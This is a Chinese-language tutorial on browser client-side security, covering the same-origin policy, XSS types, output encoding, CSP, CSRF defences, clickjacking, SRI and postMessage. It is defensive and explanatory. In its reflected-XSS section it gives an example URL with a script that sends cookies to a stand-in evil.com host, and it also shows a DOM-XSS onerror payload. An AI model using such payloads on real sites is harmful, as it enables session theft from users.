客户端安全防护

浏览器安全模型基础

Web 客户端安全的基石是浏览器的同源策略（Same-Origin Policy, SOP）。同源策略规定：一个源（Origin = 协议 + 域名 + 端口）的文档或脚本只能读取同源的资源，不能读取其他源的资源。例如，https://bank.com 的 JavaScript 不能读取 https://evil.com 的 Cookie 或 DOM 内容。

同源策略是浏览器安全的最后一道防线——如果没有它，任何打开的网页都可以读取其他网页的内容、窃取其他站点的会话令牌。但同源策略也不是万能的：它无法阻止跨站脚本（XSS）——因为注入的恶意脚本与页面自身同源；它无法阻止跨站请求伪造（CSRF）——因为浏览器在发送跨站请求时会自动携带目标站点的 Cookie。

跨站脚本攻击与防御

跨站脚本（Cross-Site Scripting, XSS）是 Web 应用中最普遍的安全漏洞，CWE-79 在 CWE Top 25 中连续多年排名第一。XSS 的本质是攻击者将恶意脚本注入到受害者浏览器中执行的合法页面中。

XSS 的三种类型

反射型 XSS（Reflected XSS）：恶意脚本包含在 URL 参数中，服务端将参数值未经编码直接嵌入响应 HTML。攻击者通过钓鱼邮件或社交工程诱导用户点击构造好的 URL。

# 恶意 URL
https://search.example.com/results?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

# 如果服务端直接输出: "搜索结果: <script>..."
# 浏览器将执行注入的脚本, 窃取用户 Cookie

存储型 XSS（Stored XSS）：恶意脚本被存储在服务端数据库中（如论坛帖子、用户评论、个人简介），当其他用户浏览包含该内容的页面时，恶意脚本在其浏览器中执行。存储型 XSS 比反射型更危险，因为它不需要诱导用户点击特定链接——所有访问该页面的用户都会受影响。

DOM 型 XSS（DOM-based XSS）：完全发生在客户端——恶意数据不经过服务端，而是通过 JavaScript 从 URL 片段（#hash）、document.referrer 或 postMessage 等客户端数据源获取输入，然后不安全地写入 DOM。

// DOM XSS 示例
// URL: https://example.com/page#<img src=x onerror=alert(1)>
const hash = location.hash.substring(1);
document.getElementById('content').innerHTML = hash; // 危险操作

XSS 防御体系

输出编码（Output Encoding）是防御 XSS 的核心措施。根据输出上下文的不同，需要使用不同的编码方式：

输出上下文 编码方式 示例
HTML 正文 HTML 实体编码 < → &lt;
HTML 属性 属性编码 " → &quot;
JavaScript JavaScript 编码 ' → \x27
URL 参数 URL 编码 < → %3C
CSS CSS 编码 : → \3A

现代前端框架的自动防护：React、Vue、Angular 等现代框架默认对所有动态插入的内容进行 HTML 编码——这是它们最重要的安全特性之一。在 React 中，JSX 表达式 {userInput} 自动被编码，只有使用 dangerouslySetInnerHTML 才会绕过保护。Vue 中 {{ userInput }} 同样自动编码，v-html 指令则会绕过保护。

关键原则：永远不要将用户输入直接插入 innerHTML、document.write()、eval()、setTimeout('...') 或 v-html、dangerouslySetInnerHTML 中。

输入验证作为纵深防御层，应在服务端对所有输入进行白名单校验。对于需要接受富文本的场景（如富文本编辑器），使用白名单 HTML 清理库（如 DOMPurify 用于客户端、Bleach 用于 Python）过滤危险标签和属性。

内容安全策略

内容安全策略（Content Security Policy, CSP）是浏览器层面防御 XSS 的强力机制。CSP 通过 HTTP 响应头或 <meta> 标签指定页面可以加载哪些来源的资源（脚本、样式、图片、字体等），违反策略的资源加载会被浏览器阻止。

CSP 指令详解

Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://cdn.example.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https://images.example.com;
    connect-src 'self' https://api.example.com;
    font-src 'self' https://fonts.googleapis.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';

核心指令解析：

指令 控制范围 安全建议
default-src 所有资源的默认策略 设为 'self'
script-src JavaScript 来源 避免 'unsafe-inline' 和 'unsafe-eval'
style-src CSS 来源 尽量避免 'unsafe-inline'
img-src 图片来源 根据需要开放 CDN 域名
connect-src AJAX/WebSocket/Fetch 目标 限制为已知 API 域名
frame-ancestors 允许嵌入本页面的父级 设为 'none' 防点击劫持
base-uri <base> 标签的 URL 设为 'self'

CSP Nonce 和 Hash

为了在严格禁止 'unsafe-inline' 的同时允许特定的内联脚本，CSP 提供了两种机制：

Nonce 模式：服务端为每个 HTTP 响应生成一个随机的 nonce 值，添加到 CSP 头和允许执行的 <script> 标签中。只有携带正确 nonce 的内联脚本才会被执行——攻击者注入的脚本因为不知道 nonce 值而被阻止。

<!-- HTTP 响应头 -->
Content-Security-Policy: script-src 'nonce-abc123def456'

<!-- HTML 页面 -->
<script nonce="abc123def456">
  // 这个脚本会执行, 因为 nonce 匹配
</script>
<script>
  // 这个脚本被阻止, 因为没有 nonce
</script>

Hash 模式：CSP 头中指定允许执行的脚本内容的哈希值。只有内容哈希匹配的内联脚本才会执行。适用于内容固定不变的内联脚本。

CSP 部署策略

分阶段部署是 CSP 的推荐实施路径：

  1. 监控阶段：使用 Content-Security-Policy-Report-Only 头部，收集违规报告但不阻止资源加载，评估对现有功能的影响
  2. 宽松策略：部署包含必要 'unsafe-inline' 的基础 CSP，阻止最明显的攻击向量
  3. 严格策略：逐步消除 'unsafe-inline'，迁移到 nonce 或 hash 模式
  4. 持续监控：配置 report-uri 或 report-to 指令，持续收集和分析 CSP 违规报告

跨站请求伪造防御

跨站请求伪造（Cross-Site Request Forgery, CSRF）利用的是浏览器自动携带 Cookie 的行为。当用户已登录 bank.com 时，如果访问了恶意网站 evil.com，evil.com 的页面可以发起一个指向 bank.com/transfer 的请求——浏览器会自动携带 bank.com 的会话 Cookie，服务端无法区分这是用户的正常操作还是攻击者的伪造请求。

CSRF 防御方案
SameSite Cookie 属性是 2025 年最推荐的 CSRF 防御方案。SameSite=Lax（Chrome 80+ 的默认值）确保 Cookie 只在同站请求和顶级导航（如点击链接）时发送，而不在跨站 POST 请求中发送——直接阻断了 CSRF 攻击的核心向量。SameSite=Strict 更严格，所有跨站请求都不发送 Cookie，但可能影响用户体验（如从搜索引擎点击链接进入登录页面时不会携带 Cookie）。


CSRF Token：服务端为每个用户会话生成一个随机的 CSRF Token，嵌入到表单的隐藏字段或 HTTP 自定义头部中。服务端在处理状态变更请求时验证 Token 是否正确。由于攻击者无法读取目标站点的页面内容（受同源策略保护），因此无法获取 CSRF Token。


双重提交 Cookie（Double Submit Cookie）：服务端将 CSRF Token 同时设置为 Cookie 和表单/Header 值。请求时浏览器自动发送 Cookie，而表单/Header 值需要 JavaScript 主动读取并附加。攻击者虽然可以触发跨站请求（浏览器自动带 Cookie），但无法读取 Cookie 值来填入表单/Header——因此两个值不一致，请求被拒绝。


其他客户端安全机制
点击劫持防御
点击劫持（Clickjacking）攻击将目标网站嵌入到透明的 iframe 中，覆盖在攻击者精心设计的页面上方。用户看到的是攻击者的界面，但点击操作实际作用在了透明 iframe 中的目标网站上。


防御方案：


    

  1. frame-ancestors CSP 指令：frame-ancestors 'none' 禁止任何站点嵌入本页面，frame-ancestors 'self' 只允许同源嵌入
    2. 

  2. X-Frame-Options HTTP 头部：DENY 完全禁止嵌入，SAMEORIGIN 允许同源嵌入（已被 CSP frame-ancestors 取代，但仍推荐同时设置以兼容旧浏览器）
    3. 



Subresource Integrity
子资源完整性（Subresource Integrity, SRI）确保从 CDN 或第三方加载的 JavaScript 和 CSS 文件未被篡改。通过在 <script> 或 <link> 标签中指定文件内容的加密哈希值，浏览器在加载资源后会验证哈希——如果不匹配（说明文件被篡改），浏览器拒绝执行。


<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>

现代前端安全挑战
第三方脚本风险
现代 Web 应用通常嵌入大量第三方脚本：分析工具（Google Analytics、Mixpanel）、广告 SDK、客服聊天组件、A/B 测试工具等。每个第三方脚本都获得了与页面自身脚本相同的权限——它们可以读取页面 DOM、发送网络请求、访问 Cookie（除非设置了 HttpOnly）。如果任何一个第三方服务被入侵，攻击者就可以在你的页面上执行任意代码。


防御策略：


    

  1. 最小化第三方依赖：定期审计并移除不再使用的第三方脚本
    2. 

  2. 使用 SRI：对所有第三方脚本添加完整性哈希
    3. 

  3. CSP 限制：通过 CSP 限制第三方脚本可以做的事情（如禁止 eval）
    4. 

  4. 沙箱隔离：将高风险第三方脚本放入 iframe sandbox 中运行
    5. 



postMessage 安全
window.postMessage() API 允许跨源窗口之间通信，突破了同源策略的限制。如果接收方不验证消息来源，可能接受恶意窗口发来的攻击载荷。


安全实践：接收 message 事件时，始终验证 event.origin 是否为预期的发送方域名；不要将 event.data 直接作为 HTML 插入页面或传递给 eval()。


总结
客户端安全是一场浏览器、Web 标准和应用开发者三方协作的持续战争。从同源策略到 CSP，从 SameSite Cookie 到 WebAuthn，浏览器不断引入新的安全机制来对抗演化的攻击手法。开发者的责任是：正确使用输出编码防御 XSS、部署严格的 CSP 策略、配置完整的安全 HTTP 头部、以及审慎管理第三方脚本风险。在 2025—2026 年的 Web 安全实践中，"安全头部全覆盖 + CSP strict-dynamic + SameSite Cookies + SRI"构成了客户端安全的基础防线。
